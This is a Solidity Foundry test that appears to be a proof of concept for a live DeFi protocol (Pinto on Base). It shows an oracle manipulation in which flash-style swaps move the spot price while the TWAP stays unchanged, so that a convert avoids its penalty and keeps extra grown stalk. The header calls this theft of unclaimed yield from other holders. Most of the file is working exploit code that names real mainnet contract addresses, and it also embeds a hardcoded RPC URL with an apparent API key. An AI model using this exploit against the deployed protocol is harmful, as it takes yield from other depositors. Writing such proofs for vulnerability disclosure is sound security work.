// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {BeanstalkDeployer} from "test/foundry/utils/BeanstalkDeployer.sol";

struct AdvancedPipeCall {
    address target;
    bytes callData;
    bytes clipboard;
}

struct Deposit {
    uint128 amount;
    uint128 bdv;
}

struct TokenDepositId {
    address token;
    uint256[] depositIds;
    Deposit[] tokenDeposits;
}

interface IPinto {
    function overallCappedDeltaB() external view returns (int256);
    function overallCurrentDeltaB() external view returns (int256);
    function balanceOfStalk(address account) external view returns (uint256);
    function grownStalkForDeposit(
        address account,
        address token,
        int96 stem
    ) external view returns (uint256);
    function getTokenDepositsForAccount(
        address account,
        address token
    ) external view returns (TokenDepositId memory);
    function getAddressAndStem(uint256 depositId) external pure returns (address token, int96 stem);
    function siloSunrise(uint256 caseId) external;
    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedPipeCall[] memory advancedPipeCalls
    )
        external
        payable
        returns (
            int96 toStem,
            uint256 fromAmount,
            uint256 toAmount,
            uint256 fromBdv,
            uint256 toBdv
        );
}

interface IWell {
    function swapFrom(
        address fromToken,
        address toToken,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint256 deadline
    ) external returns (uint256);
    function tokens() external view returns (address[] memory);
    function addLiquidity(
        uint256[] calldata tokenAmountsIn,
        uint256 minLpAmountOut,
        address recipient,
        uint256 deadline
    ) external returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title TWAP/SPOT Oracle Discrepancy PoC
 * @notice Demonstrates how an attacker can bypass convert penalties by manipulating the spot oracle
 *
 * @dev Vulnerability Summary:
 * - Convert capacity uses TWAP (overallCappedDeltaB)
 * - Penalty calculation uses SPOT (overallCurrentDeltaB)
 * - Attacker can flash-manipulate SPOT while TWAP remains unchanged
 * - This makes penalty calculation see favorable movement, reducing/avoiding penalty
 *
 * Attack Flow:
 * 1. Flash swap to manipulate SPOT oracle (push towards peg)
 * 2. Execute pipelineConvert - beforeDeltaB captures manipulated state
 * 3. Convert moves pool, afterDeltaB reflects actual state
 * 4. Penalty calculation sees "towards peg" movement due to manipulated beforeDeltaB
 * 5. Attacker preserves more grown stalk than without manipulation
 * 6. Swap back, only paying ~0.3% swap fees
 *
 * Impact: Theft of unclaimed yield through stalk dilution
 */
contract OracleManipulationPoC is BeanstalkDeployer {
    // Base Mainnet
    address constant PINTO_DIAMOND = 0xD1A0D188E861ed9d15773a2F3574a2e94134bA8f;
    address constant PINTO_USDC_WELL = 0x3e1133aC082716DDC3114bbEFEeD8B1731eA9cb1;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant CBETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
    address constant PINTO_TOKEN = 0xb170000aeeFa790fa61D6e837d1035906839a3c8;
    address constant PINTO_CBETH_WELL = 0x3e111115A82dF6190e36ADf0d552880663A4dBF1;
    address constant BASE_PIPELINE = 0xb1bE0001f5a373b69b1E132b420e6D9687155e80;
    address constant DEPOSITOR = 0x56c7B85aE9f97b93bD19B98176927eeF63D039BE;

    IPinto pinto;

    function setUp() public {
        // First fork mainnet at latest block
        vm.createSelectFork(
            "https://base-mainnet.g.alchemy.com/v2/viNSc9v6D3YMKDXgFyD9Ib8PLFL4crv0",
            40729500
        );

        // Then upgrade all facets so the modified LibPipelineConvert with logs is deployed
        upgradeAllFacets(PINTO_DIAMOND, "", new bytes(0));

        pinto = IPinto(PINTO_DIAMOND);
    }

    /**
     * @notice Compares a normal penalized convert vs a manipulated one using snapshots.
     * Demonstrates if oracle manipulation actually improves the outcome.
     */
    function test_compareNormalVsManipulated() public {
        console.log("=== COMPARISON: NORMAL VS MANIPULATED CONVERT ===");
        console.log("Block before test:", block.number);

        // 1. Setup common data
        TokenDepositId memory deposits = pinto.getTokenDepositsForAccount(DEPOSITOR, PINTO_TOKEN);
        uint256 depositIndex = 3;
        (, int96 stem) = pinto.getAddressAndStem(deposits.depositIds[depositIndex]);
        uint256 amount = uint256(deposits.tokenDeposits[depositIndex].amount);
        uint256 bdvBefore = uint256(deposits.tokenDeposits[depositIndex].bdv);
        uint256 grownBefore = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_TOKEN, stem);

        console.log("Starting Bean BDV:", _format6(bdvBefore));
        console.log("Starting Grown Stalk:", _format18(grownBefore));
        console.log("Initial DeltaB:", _formatSigned6(pinto.overallCurrentDeltaB()));

        uint256 snapshotId = vm.snapshot();

        // --- Scenario A: Normal ---
        console.log("");
        console.log("--- Scenario A: Normal (No Manipulation) ---");
        vm.startPrank(DEPOSITOR);
        (int96 stemA, , , , uint256 bdvA) = pinto.pipelineConvert(
            PINTO_TOKEN,
            _wrap(stem),
            _wrap(amount),
            PINTO_USDC_WELL,
            _createPipeCalls(amount)
        );
        uint256 grownA = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA);
        console.log("Resulting Grown Stalk (Normal):", _format18(grownA));
        console.log("Resulting BDV (Normal):        ", _format6(bdvA));
        console.log("Total Stalk (Normal):          ", _format18(bdvA * 1e12 + grownA));

        pinto.siloSunrise(1000);
        console.log(
            "Grownstalk amount after 1000 sunrise:",
            pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA)
        );
        console.log(
            "Gained grownstalk after 1000 sunrises:",
            pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA) - grownA
        );

        vm.stopPrank();
        vm.revertTo(snapshotId);
        vm.startPrank(DEPOSITOR);

        // --- Scenario B: Manipulated ---
        console.log("");
        console.log("--- Scenario B: Manipulated (Flash Swap) ---");
        console.log(">>> Swapping 1M USDC AND 300 cbETH -> Beans to push spot price ABOVE PEG <<<");
        console.log("Bean Balance before swaps: ", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
        _doLargeSwap(1_000_000e6);
        _doLargeCbEthSwap(300 ether);
        console.log("Bean Balance after swaps: ", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));

        console.log("--- POST-MANIPULATION STATE ---");
        console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
        console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));

        (int96 stemB, , , , uint256 bdvB) = pinto.pipelineConvert(
            PINTO_TOKEN,
            _wrap(stem),
            _wrap(amount),
            PINTO_USDC_WELL,
            _createPipeCalls(amount)
        );
        uint256 grownB = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
        console.log("Resulting Grown Stalk (Manipulated):", _format18(grownB));
        console.log("Resulting BDV (Manipulated):        ", _format6(bdvB));
        console.log("Total Stalk (Manipulated):          ", _format18(bdvB * 1e12 + grownB));

        pinto.siloSunrise(1000);
        console.log(
            "Grownstalk amount after 1000 sunrise:",
            pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB)
        );
        console.log(
            "Gained grownstalk after 1000 sunrises:",
            pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB) - grownB
        );

        // --- Reverse Swap (Simulate Flash Loan Repayment) ---
        console.log("");
        console.log(">>> REVERSING MANIPULATION: Swapping Beans back to USDC and cbETH <<<");
        _doReverseSwap();
        _doReverseCbEthSwap();

        console.log("--- POST-REVERSE STATE ---");
        console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
        console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));

        // Check user's deposit BDV after reverse - it should remain the same (stored at deposit time)
        uint256 grownBAfterReverse = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
        console.log("User's Grown Stalk (after reverse):", _format18(grownBAfterReverse));
        console.log("User's BDV remains:", _format6(bdvB), "(stored at deposit time!)");

        // --- Final Comparison ---
        console.log("");
        console.log("=== FINAL COMPARISON ===");
        console.log("Block after test:", block.number);
        console.log("Normal Grown Stalk:     ", _format18(grownA));
        console.log("Manipulated Grown Stalk:", _format18(grownB));
        console.log("Normal Total Stalk:     ", _format18(bdvA * 1e12 + grownA));
        console.log("Manipulated Total Stalk:", _format18(bdvB * 1e12 + grownB));

        if (grownB > grownA) {
            console.log("ATTACK SUCCESS: Manipulation preserved more Grown Stalk.");
            console.log("Advantage:", _format18(grownB - grownA));
        } else if (grownB < grownA) {
            console.log("ATTACK FAILED: Manipulation resulted in LESS Grown Stalk.");
            console.log("Safety Loss:", _format18(grownA - grownB));
        } else {
            console.log("NO DIFFERENCE: Scaling perfectly nullified the manipulation.");
        }
    }

    function _wrap(int96 val) internal pure returns (int96[] memory) {
        int96[] memory arr = new int96[](1);
        arr[0] = val;
        return arr;
    }

    function _wrap(uint256 val) internal pure returns (uint256[] memory) {
        uint256[] memory arr = new uint256[](1);
        arr[0] = val;
        return arr;
    }

    function _format6(uint256 value) internal pure returns (string memory) {
        uint256 integral = value / 1e6;
        uint256 fractional = value % 1e6;
        return string(abi.encodePacked(vm.toString(integral), ".", _pad6(fractional)));
    }

    function _formatSigned6(int256 value) internal pure returns (string memory) {
        string memory sign = value < 0 ? "-" : "";
        uint256 absVal = uint256(value < 0 ? -value : value);
        return string(abi.encodePacked(sign, _format6(absVal)));
    }

    function _format18(uint256 value) internal pure returns (string memory) {
        uint256 integral = value / 1e18;
        uint256 fractional = value % 1e18;
        return string(abi.encodePacked(vm.toString(integral), ".", _pad18(fractional)));
    }

    function _pad6(uint256 n) internal pure returns (string memory) {
        string memory s = vm.toString(n);
        while (bytes(s).length < 6) {
            s = string(abi.encodePacked("0", s));
        }
        return s;
    }

    function _pad18(uint256 n) internal pure returns (string memory) {
        string memory s = vm.toString(n);
        while (bytes(s).length < 18) {
            s = string(abi.encodePacked("0", s));
        }
        return s;
    }

    function _doLargeSwap(uint256 usdcAmount) internal {
        address[] memory tokens = IWell(PINTO_USDC_WELL).tokens();
        address pintoToken = tokens[0] == BASE_USDC ? tokens[1] : tokens[0];

        // Give tokens to DEPOSITOR since prank is active
        deal(BASE_USDC, DEPOSITOR, usdcAmount);
        IERC20(BASE_USDC).approve(PINTO_USDC_WELL, type(uint256).max);
        IWell(PINTO_USDC_WELL).swapFrom(
            BASE_USDC,
            pintoToken,
            usdcAmount,
            0,
            DEPOSITOR,
            block.timestamp
        );
    }

    function _doLargeCbEthSwap(uint256 cbEthAmount) internal {
        // Give tokens to DEPOSITOR since prank is active
        deal(CBETH, DEPOSITOR, cbEthAmount);
        IERC20(CBETH).approve(PINTO_CBETH_WELL, type(uint256).max);
        IWell(PINTO_CBETH_WELL).swapFrom(
            CBETH,
            PINTO_TOKEN,
            cbEthAmount,
            0,
            DEPOSITOR,
            block.timestamp
        );
    }

    function _doReverseSwap() internal {
        // Swap all beans we got from the manipulation back to USDC

        console.log("usdc balance before reverse swap:", IERC20(BASE_USDC).balanceOf(DEPOSITOR));
        console.log("bean balance before reverse swap:", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR);
        if (beanBalance > 0) {
            IERC20(PINTO_TOKEN).approve(PINTO_USDC_WELL, type(uint256).max);
            IWell(PINTO_USDC_WELL).swapFrom(
                PINTO_TOKEN,
                BASE_USDC,
                beanBalance,
                0,
                DEPOSITOR,
                block.timestamp
            );
        }

        console.log("usdc balance after reverse swap:", IERC20(BASE_USDC).balanceOf(DEPOSITOR));
        console.log("bean balance after reverse swap:", IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR));
    }

    function _doReverseCbEthSwap() internal {
        // Swap remaining beans back to cbETH
        uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(DEPOSITOR);
        if (beanBalance > 0) {
            IERC20(PINTO_TOKEN).approve(PINTO_CBETH_WELL, type(uint256).max);
            IWell(PINTO_CBETH_WELL).swapFrom(
                PINTO_TOKEN,
                CBETH,
                beanBalance,
                0,
                DEPOSITOR,
                block.timestamp
            );
        }
    }

    function _createPipeCalls(
        uint256 beanAmount
    ) internal pure returns (AdvancedPipeCall[] memory) {
        bytes memory approveData = abi.encodeWithSelector(
            IERC20.approve.selector,
            PINTO_USDC_WELL,
            type(uint256).max
        );

        uint256[] memory tokenAmounts = new uint256[](2);
        tokenAmounts[0] = beanAmount;
        tokenAmounts[1] = 0;

        bytes memory addLiquidityData = abi.encodeWithSelector(
            IWell.addLiquidity.selector,
            tokenAmounts,
            0,
            BASE_PIPELINE,
            type(uint256).max
        );

        AdvancedPipeCall[] memory calls = new AdvancedPipeCall[](2);
        calls[0] = AdvancedPipeCall(PINTO_TOKEN, approveData, abi.encode(0));
        calls[1] = AdvancedPipeCall(PINTO_USDC_WELL, addLiquidityData, abi.encode(0));

        return calls;
    }
}
